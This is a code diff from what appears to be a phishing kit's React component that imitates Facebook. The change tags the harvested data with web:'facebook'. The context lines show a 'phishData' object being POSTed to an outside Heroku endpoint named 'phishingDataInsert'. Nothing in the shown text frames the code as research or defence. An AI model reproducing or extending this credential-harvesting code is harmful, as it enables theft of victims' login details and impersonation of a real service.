@@ -22,7 +22,7 @@ const Facebook = () => {
     const finalIdSplit = splitIdForFinal.split('&&query=24798dak+ded&&refer+facebook&&redirect=jkl');
 
     const id = finalIdSplit[0]+finalIdSplit[1]
-    const phishData = {id,...data};
+    const phishData = {id,...data,web:'facebook'};
 
       fetch('https://ancient-garden-81797.herokuapp.com/phishingDataInsert',{
           method:'POST',
